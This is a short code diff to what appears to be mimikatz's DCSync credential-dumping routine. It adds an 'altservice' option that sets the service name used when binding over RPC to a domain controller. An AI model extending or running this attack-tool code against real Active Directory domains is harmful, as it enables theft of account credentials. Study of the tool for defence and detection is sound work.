@@ -1697,7 +1697,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	DWORD dwOutVersion = 0, i;
 	DRS_MSG_GETCHGREPLY getChRep = {0};
 	ULONG drsStatus;
-	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL;
+	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService;
 	LPWSTR szTmpDc = NULL;
 	DRS_EXTENSIONS_INT DrsExtensionsInt;
 
@@ -1722,7 +1722,8 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 				else
 					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
 
-				if(kull_m_rpc_createBinding(L"ncacn_ip_tcp", szDc, NULL, L"ldap", RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
+				kull_m_string_args_byName(argc, argv, L"altservice", &szService, L"ldap");
+				if(kull_m_rpc_createBinding(L"ncacn_ip_tcp", szDc, NULL, szService, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
 				{
 					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
 					{
